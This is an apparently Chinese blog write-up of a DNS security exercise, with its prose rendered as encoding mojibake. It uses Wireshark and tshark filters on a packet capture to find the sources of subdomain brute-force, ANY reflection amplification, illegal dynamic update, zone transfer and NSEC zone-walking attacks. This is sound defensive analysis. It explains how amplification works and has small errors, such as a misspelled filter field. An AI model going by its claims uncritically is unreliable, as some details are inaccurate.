DNSæ˜¯äº’è”ç½‘ä¸­é‡è¦çš„åŸºç¡€è®¾æ–½ä¹‹ä¸€ï¼Œå¯¹ç½‘ç»œçš„ç¨³å®šè¿è¡Œæœ‰è‡³å…³é‡è¦çš„ä½œç”¨ã€‚ç„¶è€Œï¼Œç”±äºè®¾è®¡ç¼ºé™·ï¼ŒDNS å­˜åœ¨è¯¸å¤šè„†å¼±ç‚¹ï¼Œå› æ­¤å¯è¢«åˆ©ç”¨ä¸è¯¸å¤šæ”»å‡»ã€‚æœ¬é¢˜å¯¹å¸¸è§çš„ DNS å®‰å…¨é—®é¢˜è¿›è¡Œè€ƒå¯Ÿã€‚</li>
</ol>
<h2 id="äºŒã€çŸ¥è¯†å‚¨å¤‡">äºŒã€çŸ¥è¯†å‚¨å¤‡</h2>
<h3 id="DNSåè®®åŠæŠ¥æ–‡æ ¼å¼">DNSåè®®åŠæŠ¥æ–‡æ ¼å¼</h3>
<p>è¿™ç¯‡<a href="https://jocent.me/2017/06/18/dns-protocol-principle.html#_label2">æ–‡ç« </a>å¯¹äºDNSè®²çš„è¿˜æ¯”è¾ƒé€å½»ï¼Œåœ¨æ­¤åŸºç¡€åšä¸€ç‚¹æ‘˜è¦ã€‚</p>
<ul>
<li>
<p>åŸŸåå±‚æ¬¡ç»“æ„<br>
åŸŸåå±‚æ¬¡</p>
</li>
<li>
<p>åŸŸåæœåŠ¡å™¨<br>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406143519.png" alt=""><br>
å¦å¤–è¿˜æœ‰ä¸€ä¸ªæœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼šå½“ä¸€ä¸ªä¸»æœºå‘å‡ºDNSæŸ¥è¯¢è¯·æ±‚çš„æ—¶å€™ï¼Œè¿™ä¸ªæŸ¥è¯¢è¯·æ±‚é¦–å…ˆå°±æ˜¯å‘ç»™æœ¬åœ°åŸŸåæœåŠ¡å™¨çš„ã€‚</p>
</li>
<li>
<p>åŸŸåè§£æè¿‡ç¨‹</p>
<p>ä»¥æŸ¥è¯¢<code>jocent.me</code>ä¸ºä¾‹ï¼Œå…¶ä¸­10.74.36.90ä¸ºä¸»æœºIPï¼Œ10.74.1.11ä¸ºæœ¬åœ°DNSæœåŠ¡å™¨ï¼š<br/><br>
â‘ ä¸»æœº10.74.36.90å…ˆå‘æœ¬åœ°åŸŸåæœåŠ¡å™¨10.74.1.11è¿›è¡Œé€’å½’æŸ¥è¯¢<br/><br>
â‘¡æœ¬åœ°åŸŸåæœåŠ¡å™¨é‡‡ç”¨è¿­ä»£æŸ¥è¯¢ï¼Œå‘ä¸€ä¸ªæ ¹åŸŸåæœåŠ¡å™¨è¿›è¡ŒæŸ¥è¯¢<br/><br>
â‘¢æ ¹åŸŸåæœåŠ¡å™¨å‘Šè¯‰æœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼Œä¸‹ä¸€æ¬¡åº”è¯¥æŸ¥è¯¢çš„é¡¶çº§åŸŸåæœåŠ¡å™¨<code>dns.me</code>çš„IPåœ°å€<br/><br>
â‘£æœ¬åœ°åŸŸåæœåŠ¡å™¨å‘é¡¶çº§åŸŸåæœåŠ¡å™¨<code>dns.me</code>è¿›è¡ŒæŸ¥è¯¢<br/><br>
â‘¤é¡¶çº§åŸŸåæœåŠ¡å™¨meå‘Šè¯‰æœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼Œä¸‹ä¸€æ­¥æŸ¥è¯¢æƒé™æœåŠ¡å™¨<code>dns.jocent.me</code>çš„IPåœ°å€<br/><br>
â‘¥æœ¬åœ°åŸŸåæœåŠ¡å™¨å‘æƒé™æœåŠ¡å™¨<code>dns.jocent.me</code>è¿›è¡ŒæŸ¥è¯¢<br/><br>
â‘¦æƒé™æœåŠ¡å™¨<code>dns.jocent.me</code>å‘Šè¯‰æœ¬åœ°åŸŸåæœåŠ¡å™¨æ‰€æŸ¥è¯¢çš„ä¸»æœºçš„IPåœ°å€<br/><br>
â‘§æœ¬åœ°åŸŸåæœåŠ¡å™¨æœ€åæŠŠæŸ¥è¯¢ç»“æœå‘Šè¯‰ 10.74.36.90<br/><br>
å…¶ä¸­æœ‰ä¸¤ä¸ªæ¦‚å¿µé€’å½’æŸ¥è¯¢å’Œè¿­ä»£æŸ¥è¯¢:<br>
<strong>é€’å½’æŸ¥è¯¢</strong>ï¼šæœ¬æœºå‘æœ¬åœ°åŸŸåæœåŠ¡å™¨å‘å‡ºä¸€æ¬¡æŸ¥è¯¢è¯·æ±‚ï¼Œå°±é™å¾…æœ€ç»ˆçš„ç»“æœã€‚å¦‚æœæœ¬åœ°åŸŸåæœåŠ¡å™¨æ— æ³•è§£æï¼Œè‡ªå·±ä¼šä»¥DNSå®¢æˆ·æœºçš„èº«ä»½å‘å…¶å®ƒåŸŸåæœåŠ¡å™¨æŸ¥è¯¢ï¼Œç›´åˆ°å¾—åˆ°æœ€ç»ˆçš„IPåœ°å€å‘Šè¯‰æœ¬æœºã€‚<br/><br>
<strong>è¿­ä»£æŸ¥è¯¢</strong>ï¼šæœ¬åœ°åŸŸåæœåŠ¡å™¨å‘æ ¹åŸŸåæœåŠ¡å™¨æŸ¥è¯¢ï¼Œæ ¹åŸŸåæœåŠ¡å™¨å‘Šè¯‰å®ƒä¸‹ä¸€æ­¥åˆ°å“ªé‡Œå»æŸ¥è¯¢ï¼Œç„¶åå®ƒå†å»æŸ¥ï¼Œæ¯æ¬¡å®ƒéƒ½æ˜¯ä»¥å®¢æˆ·æœºçš„èº«ä»½å»å„ä¸ªæœåŠ¡å™¨æŸ¥è¯¢ã€‚</p>
</li>
<li>
<p>æŠ¥æ–‡æ ¼å¼<br>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406143746.png" alt=""></p>
</li>
</ul>
<h3 id="a-id-ANY-DNSèµ„æºè®°å½•ANYç±»å‹"><a id='ANY'> <strong>DNSèµ„æºè®°å½•ANYç±»å‹</strong></h3>
<p>ä¸ºä»€ä¹ˆåœ¨DDOSæ–¹æ³•æ”»å‡»çš„æ—¶å€™éœ€è¦æŒ‡å®šANYç±»å‹å‚æ•°ï¼Œæˆ‘ä»¬ä½¿ç”¨digå‘½ä»¤æ¥çœ‹ä¸€ä¸‹å…·ä½“æƒ…å†µï¼š<br>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144123.png" alt=""><br>
å¯ä»¥çœ‹åˆ°ï¼ŒDNSæœåŠ¡å™¨è¿”å›äº†è¯¥æœåŠ¡å™¨ä¸­æ‰€æœ‰å…³äº<code>163.com</code>çš„èµ„æºè®°å½•ï¼ŒåŒ…æ‹¬ç±»å‹Aï¼ŒNSï¼ŒMXï¼ŒTXTï¼Œè¿™æ ·å°±ä½¿å¾—å“åº”æ•°æ®åŒ…è¿œè¿œå¤§äºè¯·æ±‚æ•°æ®åŒ…ã€‚<br>
æˆ‘ä»¬ä¸å¦¨å†å¾€æ·±å±‚æ¬¡æƒ³ä¸€æƒ³ï¼Œå·²çŸ¥UDPæ•°æ®åŒ…çš„æœ€å¤§é•¿åº¦æ˜¯512å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯è¯´å½“DNSå“åº”æ•°æ®å¤§äº512å­—èŠ‚çš„æ—¶å€™ï¼Œæ•°æ®åªè¿”å›512å­—èŠ‚ï¼Œå‰©ä½™çš„æ•°æ®å°†è¢«ä¸¢å¼ƒã€‚ä¸ºä»€ä¹ˆåœ¨è¿™ä¸ªåœ°æ–¹DNSçš„å“åº”æ•°æ®å¯ä»¥è¿”å›å¤§äº2000å­—èŠ‚çš„æ•°æ®å‘¢ï¼Ÿå¯ä»¥å»æŸ¥çœ‹è¯·æ±‚æ•°æ®åŒ…ä¸­çš„Additional Recordsæœ‰ä¸€æ¡OPTç±»å‹çš„èµ„æºè®°å½•ï¼ŒOPTç±»å‹æ˜¯ä¸€ç§ä¸€ä¸ªâ€œä¼ª DNSè®°å½•ç±»å‹â€ä»¥æ”¯æŒ EDNSåè®®ï¼Œå…¶ä¸­<code>UDP Payload Size</code>å­—æ®µå¯ä»¥æŒ‡å®šDNSè¿”å›æŠ¥æ–‡çš„æœ€å¤§é•¿åº¦ã€‚<a href="http://blog.hnxiezan.com/blog/post/1/">è¿™é‡Œ</a>å¯¹EDNSæœ‰æ¯”è¾ƒè¯¦ç»†çš„è§£é‡Šã€‚</p>
<h3 id="DNSæ”»å‡»ç±»å‹">DNSæ”»å‡»ç±»å‹</h3>
<p><a href="https://securitytrails.com/blog/most-popular-types-dns-attacks">è¿™é‡Œ</a>æœ‰å¯¹DNSçš„å„ç§æ”»å‡»ç±»å‹çš„ä»‹ç»ã€‚</p>
<h3 id="dns-flags-optå¸¸è§çš„å€¼"><code>dns.flags.opt</code><strong>å¸¸è§çš„å€¼</strong></h3>
<ul>
<li>
<p>dns.flags.opcode=0(åªæ˜¾ç¤ºDNSå¸¸è§„æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSå“åº”æ¶ˆæ¯)</p>
</li>
<li>
<p>dns.flags.opcode=1(åªæ˜¾ç¤ºDNSé€†å‘æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSå“åº”æ¶ˆæ¯)</p>
</li>
<li>
<p>dns.flags.opcode=2(åªæ˜¾ç¤ºDNSæœåŠ¡å™¨çŠ¶æ€è¯·æ±‚æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSæœåŠ¡å™¨çŠ¶æ€å“åº”æ¶ˆæ¯)</p>
</li>
<li>
<p>dns.flags.opcode=5(åªæ˜¾ç¤ºDNSåŠ¨æ€æ›´æ–°æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSåŠ¨æ€æ›´æ–°å“åº”æ¶ˆæ¯ï¼‰</p>
</li>
</ul>
<h3 id="DNSèµ„æºè®°å½•ï¼ˆRRï¼‰ç±»å‹â€”â€”NSå’ŒSOA">DNSèµ„æºè®°å½•ï¼ˆRRï¼‰ç±»å‹â€”â€”NSå’ŒSOA</h3>
<p><a href="https://www.cnblogs.com/comefuture/p/7543752.html">NSå’ŒSOAçš„åŒºåˆ«</a></p>
<p><strong>SOA</strong>ï¼Œå³Start Of Authorityï¼Œæ”¾åœ¨ zone file ä¸­ï¼Œç”¨äºæè¿°è¿™ä¸ª zone è´Ÿè´£çš„ name serverï¼Œversion numberâ€¦ç­‰èµ„æ–™ï¼Œä»¥åŠå½“ slave server è¦å¤‡ä»½è¿™ä¸ª zone æ—¶çš„ä¸€äº›å‚æ•°ã€‚æ¯ä¸ª zone file ä¸­å¿…é¡»æœ‰ä¸”ä»…æœ‰ä¸€æ¡ SOARR ï¼Œå¹¶åœ¨ zone file ä¸­ä½œä¸ºç¬¬ä¸€æ¡èµ„æºè®°å½•ä¿å­˜ã€‚</p>
<h3 id="DNSèµ„æºè®°å½•ï¼ˆRRï¼‰ç±»å‹â€”â€”AXFRå’ŒIXFR">DNSèµ„æºè®°å½•ï¼ˆRRï¼‰ç±»å‹â€”â€”AXFRå’ŒIXFR</h3>
<p>AXFRï¼ˆå®Œå…¨åŒºåŸŸä¼ è¾“ 252ï¼‰ï¼šç”±ä¸»åŸŸåæœåŠ¡å™¨è½¬ç§»æ•´ä¸ªåŒºåŸŸæ–‡ä»¶è‡³è¾…åŠ©åŸŸåæœåŠ¡å™¨ã€‚</p>
<p>IXFRï¼ˆå¢é‡åŒºåŸŸä¼ è¾“ 251ï¼‰ï¼šè¯·æ±‚åªæœ‰ä¸å…ˆå‰æµæ°´å¼ç¼–å·ä¸åŒçš„ç‰¹å®šåŒºåŸŸçš„åŒºåŸŸè½¬ç§»ã€‚æ­¤è¯·æ±‚æœ‰æœºä¼šè¢«æ‹’ç»ï¼Œå¦‚æœæƒå¨æœåŠ¡å™¨ç”±äºé…ç½®æˆ–ç¼ºä¹å¿…è¦çš„æ•°æ®è€Œæ— æ³•å±¥è¡Œè¯·æ±‚ï¼Œä¸€ä¸ªå®Œæ•´çš„ï¼ˆAXFRï¼‰ä¼šè¢«å‘é€ä»¥ä½œå›åº”ã€‚</p>
<p><a href="https://www.cnblogs.com/cyjaysun/p/4265240.html">è¯¦ç»†ä»‹ç»</a></p>
<h3 id="DNSSECåè®®">DNSSECåè®®</h3>
<p><a href="https://bbs.huaweicloud.com/blogs/1f0fba3f514e11e9bd5a7ca23e93a891">æµ…è°ˆDNSåŸŸåå®‰å…¨æ‰©å±•åè®®DNSSEC</a></p>
<hr>
<h2 id="ä¸‰ã€è§£é¢˜è¿‡ç¨‹">ä¸‰ã€è§£é¢˜è¿‡ç¨‹</h2>
<h3 id="1-å­åŸŸåçˆ†ç ´æ”»å‡»">1.å­åŸŸåçˆ†ç ´æ”»å‡»</h3>
<ul>
<li>
<p>æ”»å‡»åŸç†</p>
<p><a href="https://www.secpulse.com/archives/55823.html">ä¼ é€é—¨</a></p>
</li>
<li>
<p>å‘ç°è¿‡ç¨‹<br>
é¦–å…ˆï¼Œç”¨ Wireshark æ‰“å¼€ pcap åŒ…ï¼Œç»˜åˆ¶ IO Graphsï¼š<br>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406145336.png" alt=""><br>
å¯è§ï¼Œåœ¨ 5500 - 6000s ä¸­å‡ºç°äº†å¼‚å¸¸çš„å³°å€¼æµé‡ï¼Œå°†5500såˆ°6000sæ‰€æœ‰è¯·æ±‚ã€å“åº”æå–åˆ°æ–°çš„ pcapæ–‡ä»¶ã€‚</p>
<p>æ¥ä¸‹æ¥ä½¿ç”¨ åè®®åˆ†çº§ æŸ¥çœ‹å“ªäº›åè®®å æ¯”æœ€å¤šï¼š<br>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144222.png" alt=""><br>
å¯ä»¥çœ‹åˆ°ï¼Œåˆ‡å‡ºæ¥çš„åŒ…é‡Œé¢ä»…æœ‰DNSåè®®ï¼Œè€Œä¸”ç”¨æˆ·ä¸»åŠ¨å‘é€çš„æ•°æ®åŒ…å æ¯”æœ€å¤§ã€‚<br>
æŸ¥çœ‹åˆ†ç»„é•¿åº¦<br>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144233.png" alt=""><br/><br>
<strong>é•¿åº¦ä¸º1280~2559å­—èŠ‚çš„æ•°æ®åŒ…é€šå¸¸è¡¨ç¤ºæ•°æ®ä¼ è¾“ï¼Œé•¿åº¦è¾ƒå°çš„æ•°æ®åŒ…åˆ™è¡¨ç¤ºåè®®æ§åˆ¶åºåˆ—</strong></p>
<p>ä»¥è¯·æ±‚æ•°é‡ä»é«˜åˆ°ä½çš„ IP åœ°å€è¿›è¡Œæ’åºã€‚<br>
<strong>æ–¹æ³•ä¸€(é€Ÿåº¦å¾ˆæ…¢)ï¼š</strong><br>
ä½¿ç”¨wiresharkçš„ç»Ÿè®¡åŠŸèƒ½ï¼Œå¹¶ä¸”ç”¨<code>dns.flags.response == 0</code>è¿›è¡Œç­›é€‰(åªçœ‹DNSæŸ¥è¯¢æŠ¥æ–‡)ï¼š<br>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144251.png" alt=""><br/><br>
<strong>æ–¹æ³•äºŒï¼š</strong></p>
<p>ä½¿ç”¨tsharkå‘½ä»¤è¡Œè¿›è¡Œç­›é€‰<code>tshark -r timeTop.pcap -T fields -e ip.src -e ip.dst | tr &quot;\t&quot; &quot;\n&quot; | sort | uniq -c | sort -nr &gt; ipRank.txt</code></p>
<p>å‚æ•°è§£é‡Šï¼š</p>
<p>-r æŒ‡å®šç›®æ ‡æ–‡ä»¶</p>
<p>-Y æŒ‡å®šè¿‡æ»¤è§„åˆ™</p>
<p>-T pdml|ps|text|fields|psml,è®¾ç½®è§£ç ç»“æœè¾“å‡ºçš„æ ¼å¼ï¼ŒåŒ…æ‹¬text,ps,psmlå’Œpdmlï¼Œé»˜è®¤ä¸ºtext</p>
<p>-e  å¦‚æœ-T fieldsé€‰é¡¹æŒ‡å®šï¼Œ-eç”¨æ¥æŒ‡å®šè¾“å‡ºå“ªäº›å­—æ®µ</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144308.png" alt=""><br>
é¦–å…ˆæŸ¥çœ‹ç¬¬ä¸€ä¸ªIP 45.80.170.1ï¼š<br>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144331.png" alt=""><br>
å¯ä»¥çœ‹åˆ°è¿™ä¸ªIPåœ°å€æ˜¯ä¸€ä¸ªDNSæœåŠ¡ã€‚<br>
å†æ¥æŸ¥çœ‹ç¬¬äºŒä¸ªIP 144.202.64.226ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144341.png" alt=""><br>
144.202.64.226 å‘èµ·äº†å¤§é‡é’ˆå¯¹<code>b0e.com.cn</code>åŸŸåçš„æŸ¥è¯¢è¯·æ±‚ï¼Œä¸”å¤§éƒ¨åˆ†ç›¸åº”ç»“æœå‡ä¸º No such nameï¼Œå› æ­¤åˆ¤æ–­æ­¤ç±»æ”»å‡»ä¸ºå­åŸŸåçˆ†ç ´æ”»å‡»ã€‚<br>
é€šè¿‡è§‚å¯Ÿï¼Œå¯ä»¥å‘ç°ï¼Œå‰ 10 ä¸ªè¯·æ±‚å¹¶ä¸æ˜¯åŸŸåçˆ†ç ´æ”»å‡»ï¼Œå»æ‰è¯¥ 10 ä¸ªè¯·æ±‚åï¼Œç¬¬ä¸€ç±»æ”»å‡»å…±æœ‰ 34184 ä¸ªã€‚</p>
</li>
</ul>
<h3 id="2-DDOSåå°„æ”¾å¤§æ”»å‡»">2. DDOSåå°„æ”¾å¤§æ”»å‡»</h3>
<ul>
<li>
<p>æ”»å‡»åŸç†<br>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144404.png" alt=""></p>
<ul>
<li>æµé‡æ”¾å¤§ï¼šåˆ©ç”¨å›å¤åŒ…æ¯”è¯·æ±‚åŒ…å¤§çš„ç‰¹ç‚¹</li>
<li>åœ°å€ä¼ªé€ ï¼šä¼ªé€ è¯·æ±‚åŒ…çš„æºåœ°å€ä¸ºæ”»å‡»ç›®æ ‡</li>
<li>åˆ†å¸ƒå¼ï¼šå¤šä¸ª DNS åŒæ—¶å‘æ”»å‡»ç›®æ ‡è¿”å›å¤§é‡å“åº”</li>
</ul>
</li>
<li>
<p>æ”»å‡»ç‰¹å¾</p>
<ul>
<li>é€šè¿‡é€’å½’æŸ¥è¯¢ä»è€Œæ”¾å¤§æµé‡ï¼Œå› æ­¤recursion=1ï¼ŒANYå‚æ•°ï¼ˆ<a href="#ANY">ä¸ºä»€ä¹ˆå¿…é¡»æ˜¯ANYå‚æ•°</a>ï¼‰ã€‚</li>
<li>è¦æ±‚è¿”å›åŒ…è¿œè¿œå¤§äºå‘é€åŒ…ï¼Œä¸€èˆ¬è¿”å›åŒ…çš„è¦æ±‚å¤§äº3000ã€‚å³dns.rr.udp_payload_size&gt;=3000ã€‚</li>
</ul>
</li>
<li>
<p>å‘ç°è¿‡ç¨‹<br>
é€šè¿‡æ”»å‡»ç‰¹å¾å¯ä»¥å¾—å‡ºç­›é€‰æ¡ä»¶<code>dns.flags.response == 0 &amp;&amp; dns.flags.recdesired == 1 &amp;&amp; dns.qry.type == 255 &amp;&amp; dns.rr.udp_payload_size &gt;= 3000</code>ï¼Œå†å¯¹ç­›é€‰åçš„IPåœ°å€è¿›è¡Œç»Ÿè®¡ï¼š<code>tshark -r q1_final.pcap -Y &quot;dns.flags.recdesired==1 &amp;&amp; dns.flags.response==0 &amp;&amp; dns.rr.udp_payload_size&gt;=3000 &amp;&amp; dns.qry.type==255&quot; -T fields -e ip.src -e ip.dst | sort | uniq -c| sort -nr|more</code><br>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144423.png" alt=""><br>
è¿™æ ·å°±è¿‡æ»¤å‡ºäº† DNS æœåŠ¡å“åº”æ•°æ®äº†ï¼Œä¸€å…±æœ‰188.141.167.218ï¼Œ187.199.129.12ï¼Œ70.85.232.160ï¼Œ45.80.170.1å››ä¸ªDNSæœåŠ¡å™¨ï¼Œæ¥ç€æ’é™¤ä¸æ”¯æŒ <strong>ANY</strong> çš„ DNS æœåŠ¡å™¨ï¼Œä¹Ÿå°±æ˜¯ Refusedï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144436.png" alt=""></p>
<p>æ’æŸ¥ä¹‹åï¼Œå¯çŸ¥æ”»å‡»IPï¼ˆä¹Ÿå°±æ˜¯æ’é™¤ç›®çš„IPä¸º45.80.170.1çš„æºIPï¼‰ï¼š127.130.104.152ï¼Œ175.222.102.169ï¼Œ105.191.150.205ã€‚</p>
</li>
</ul>
<h3 id="3-éæ³•DNS-åŠ¨æ€æ›´æ–°æ”»å‡»">3. éæ³•DNS åŠ¨æ€æ›´æ–°æ”»å‡»</h3>
<ul>
<li>
<p>æ”»å‡»åŸç†</p>
<p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc771255(v=ws.11)">è¿™é‡Œ</a>å¯¹DNS Dynamic Updateæœ‰æ¯”è¾ƒè¯¦ç»†çš„ä»‹ç»ã€‚ç®€å•åœ°æ¥è¯´ï¼ŒDNS å®¢æˆ·ç«¯åœ¨ IP åœ°å€æˆ–åç§°å‡ºç°æ›´æ”¹çš„ä»»ä½•æ—¶å€™éƒ½å¯åˆ©ç”¨ DNS æœåŠ¡å™¨æ¥æ³¨å†Œå’ŒåŠ¨æ€æ›´æ–°å…¶èµ„æºè®°å½•ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ IP æ¬ºéª—ä¼ªè£…æˆ DNS æœåŠ¡å™¨ä¿¡ä»»çš„ä¸»æœºå¯¹åŒºæ•°æ®è¿›è¡Œæ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢ã€‚</p>
</li>
<li>
<p>æ”»å‡»ç‰¹å¾ï¼š</p>
<ul>
<li><code>dns.flags.opt==5</code>æ˜¾ç¤ºDNSåŠ¨æ€æ›´æ–°æŸ¥è¯¢æ¶ˆæ¯ï¼Œä»¥åŠç›¸åº”çš„DNSåŠ¨æ€æ›´æ–°å“åº”æ¶ˆæ¯</li>
</ul>
</li>
<li>
<p>å‘ç°è¿‡ç¨‹</p>
<p>ä½¿ç”¨tsharkå‘½ä»¤ç­›é€‰ï¼š<code>tshark -r q1_final.pcap -Y &quot;dns.flags.opcode==5 &amp;&amp; dns.flags.response==0&quot; -T fields -e ip.src -e ip.dst | sort | uniq -c | sort -nr|more </code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144450.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144507.png" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œæœ‰å››ä¸ªæ”»å‡»IPï¼š19.220.251.87 414ï¼Œ200.152.141.106 15ï¼Œ18.100.48.86 4091ï¼Œ237.205.156.233 535</p>
</li>
</ul>
<h3 id="4-éæ³•DNSåŸŸä¼ è¾“æ”»å‡»">4. éæ³•DNSåŸŸä¼ è¾“æ”»å‡»</h3>
<ul>
<li>
<p>æ”»å‡»åŸç†</p>
<p>è¾… DNS æœåŠ¡å™¨ï¼Œéœ€è¦ä¸ä¸» DNS æœåŠ¡å™¨è¿›è¡Œé€šä¿¡ï¼ŒåŠ è½½æ•°æ®ä¿¡æ¯ï¼Œç§°ä¸ºåŒºåŸŸä¼ é€ï¼ˆZone Transferï¼‰ã€‚AXFR è¯·æ±‚ï¼Œå¸¸å¯¼è‡´å…¨åŒºåŸŸä¼ é€ï¼Œéœ€è¦èŠ±è´¹å¤§é‡çš„æ—¶é—´ä¸å¸¦å®½ã€‚</p>
<p>å¤§é‡çš„ AXFR ã€IXFRè¯·æ±‚ï¼Œå¯å¯¼è‡´ DDoSã€‚æƒé™é…ç½®ä¸å½“ï¼Œå¯å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼ˆæµ‹è¯•åŸŸåã€å†…éƒ¨åŸŸåï¼‰ã€‚</p>
</li>
<li>
<p>æ”»å‡»ç‰¹å¾</p>
<p><code>dns.flags.repsonse==0 &amp;&amp; dns.qry.type==252 || dns.qry.type==251</code></p>
</li>
<li>
<p>å‘ç°è¿‡ç¨‹</p>
<p>æˆ‘ä»¬ç”¨è¿‡æ»¤å™¨<code>dns.qry.type in &#123;251 252&#125;</code>æŠŠAXFRå’ŒIXFRè¿‡æ»¤å‡ºæ¥ï¼ŒæŸ¥çœ‹æœ‰å“ªäº›ç–‘ä¼¼æ”»å‡»IP</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144519.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144531.png" alt=""></p>
<p>æœ‰ä¸¤ä¸ª221.223.19.169 å’Œä¸€ä¸ª129.191.74.107 å‘æ¥çš„åŸŸä¼ é€è¯·æ±‚åŒ…ï¼Œä»¥åŠå¤§é‡çš„96.199.230.176 å‘æ¥çš„åŸŸä¼ é€è¯·æ±‚åŒ…ã€‚ä»”ç»†æ£€æŸ¥ä¸€ä¸‹å‰ä¸¤ä¸ªIPåœ°å€çš„æ•°æ®åŒ…åï¼Œæˆ‘ä»¬è®¤ä¸ºå‰é¢ä¸¤ä¸ªæœ‰å¯èƒ½æ˜¯ç®¡ç†å‘˜é…ç½®ä¸å½“ç­‰é€ æˆçš„ï¼Œ<br>
è€Œæœ€åçš„ä¸€ä¸ªå¤§é‡çš„è¯·æ±‚æ•°æ®åŒ…æ˜¾ç„¶å°±æ˜¯åŸŸä¼ é€æ”»å‡»äº†ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144544.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144555.png" alt=""></p>
</li>
</ul>
<h3 id="5-DNSSec-NSec-åŸŸåéå†æ”»å‡»">5. DNSSec NSec åŸŸåéå†æ”»å‡»</h3>
<ul>
<li>
<p>æ”»å‡»åŸç†</p>
<p><a href="https://www.cloudxns.net/Support/detail/id/1309.html">DNSSecçš„æ¦‚å¿µä¸ä½œç”¨</a></p>
<p><a href="https://info.menandmice.com/blog/bid/73645/Take-your-DNSSEC-with-a-grain-of-salt">NSECï¼šWalking a DNS zone</a></p>
<p>NSECæšä¸¾è¿™æ˜¯é’ˆå¯¹DNSSECçš„ä¸€ç§æ”»å‡»ï¼Œåœ¨æœªä½¿ç”¨NSEC3çš„DNSSECä¸­ï¼Œè‹¥æŸ¥è¯¢åŒºæ–‡ä»¶ä¸­ä¸å­˜åœ¨çš„åŸŸåï¼Œä¼šä»¥NSECè®°å½•çš„å½¢å¼æä¾›é è¿‘å…¶çš„æœ€è¿‘çš„ä¸‹ä¸€æ¡åŸŸåï¼Œè¿™å°±é€ æˆäº†å¯èƒ½æ„é€ ç‰¹æ®Šè¯·æ±‚ï¼Œæ¥éå†åŒºæ–‡ä»¶ï¼Œé€ æˆåŒºæ–‡ä»¶çš„æ³„éœ²ã€‚</p>
</li>
<li>
<p>æ”»å‡»ç‰¹å¾</p>
<p>åŸŸåéå†æ”»å‡»ä¾èµ–äºNSecèµ„æºè®°å½•ç±»å‹ï¼Œå¯ä»¥ä½¿ç”¨``dns.resp.type==47`è¿›è¡Œåˆæ­¥ç­›é€‰</p>
</li>
<li>
<p>å‘ç°è¿‡ç¨‹</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144609.png" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æŠŠANYåå°„å‹Dosæ”»å‡»ä¹Ÿç­›é€‰å‡ºæ¥äº†ï¼Œäºæ˜¯å†åŠ ä¸Š<code>not dns.qry.type==255</code>æ¡ä»¶å°±å¯ä»¥å¾—åˆ°DNSSec NSec åŸŸåéå†æ”»å‡»IPï¼š6.116.183.244</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144624.png" alt=""></p>
</li>
</ul>
<hr>
<h2 id="å››ã€Q-A">å››ã€Q&amp;A</h2>
<ol>
<li>
<p>pacpåŒ…æ–‡ä»¶è¿‡å¤§ï¼ŒWiresharkåŠ è½½å¤±è´¥</p>
<p>è§£å†³åŠæ³•ï¼šä½¿ç”¨ <code>editcap -c &lt;packets per file&gt; åŸå§‹æ–‡ä»¶.pcap è¾“å‡ºæ–‡ä»¶.pcap</code> å‘½ä»¤ï¼›æˆ–è€…ä½¿ç”¨<code>tcpdump -r old_file -w new_files -C 10</code>ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ¯ä¸ªæ–‡ä»¶çš„å¤§å°æ˜¯10 millionå­—èŠ‚ã€‚</p>
</li>
<li>
<p>bashç®¡é“æ ¼å¼åŒ–è¾“å‡ºå‘½ä»¤</p>
<ul>
<li><a href="https://blog.csdn.net/u010003835/article/details/80752797">tr</a></li>
<li><a href="https://www.jianshu.com/p/291632a11ede">sort -nc</a></li>
